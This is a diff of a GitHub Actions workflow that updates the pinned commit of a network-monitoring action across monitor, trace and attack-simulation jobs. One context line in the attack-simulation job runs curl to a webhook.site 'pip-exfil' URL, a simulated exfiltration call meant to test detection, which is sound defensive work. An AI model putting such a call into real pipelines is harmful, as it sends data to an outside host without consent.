@@ -15,7 +15,7 @@ jobs:
     name: "Monitor mode (npm + pip)"
     runs-on: ubuntu-latest
     steps:
-      - uses: kondukto-io/kntrl-action@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
+      - uses: kondukto-io/kntrl-action@f75ac469b9759e7fc4182f57e6a5ea0ba4c9fdc5 # v2-ts
         with:
           mode: monitor
 
@@ -41,7 +41,7 @@ jobs:
       - name: python test
         run: python app.py
 
-      - uses: kondukto-io/kntrl-action/stop@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
+      - uses: kondukto-io/kntrl-action/stop@f75ac469b9759e7fc4182f57e6a5ea0ba4c9fdc5 # v2-ts
         if: always()
 
   # ──────────────────────────────────────────────
@@ -51,7 +51,7 @@ jobs:
     name: "Trace mode (npm + pip)"
     runs-on: ubuntu-latest
     steps:
-      - uses: kondukto-io/kntrl-action@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
+      - uses: kondukto-io/kntrl-action@f75ac469b9759e7fc4182f57e6a5ea0ba4c9fdc5 # v2-ts
         with:
           mode: trace
           allowed_hosts: "api.github.com"
@@ -78,7 +78,7 @@ jobs:
       - name: python test
         run: python app.py
 
-      - uses: kondukto-io/kntrl-action/stop@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
+      - uses: kondukto-io/kntrl-action/stop@f75ac469b9759e7fc4182f57e6a5ea0ba4c9fdc5 # v2-ts
         if: always()
 
   # ──────────────────────────────────────────────
@@ -88,7 +88,7 @@ jobs:
     name: "Trace mode (attack simulation)"
     runs-on: ubuntu-latest
     steps:
-      - uses: kondukto-io/kntrl-action@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
+      - uses: kondukto-io/kntrl-action@f75ac469b9759e7fc4182f57e6a5ea0ba4c9fdc5 # v2-ts
         with:
           mode: trace
           allowed_hosts: "api.github.com"
@@ -123,5 +123,5 @@ jobs:
         run: python3 -c "import subprocess; subprocess.run(['curl', '-s', '--max-time', '3', 'https://webhook.site/pip-exfil'])"
         continue-on-error: true
 
-      - uses: kondukto-io/kntrl-action/stop@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
+      - uses: kondukto-io/kntrl-action/stop@f75ac469b9759e7fc4182f57e6a5ea0ba4c9fdc5 # v2-ts
         if: always()
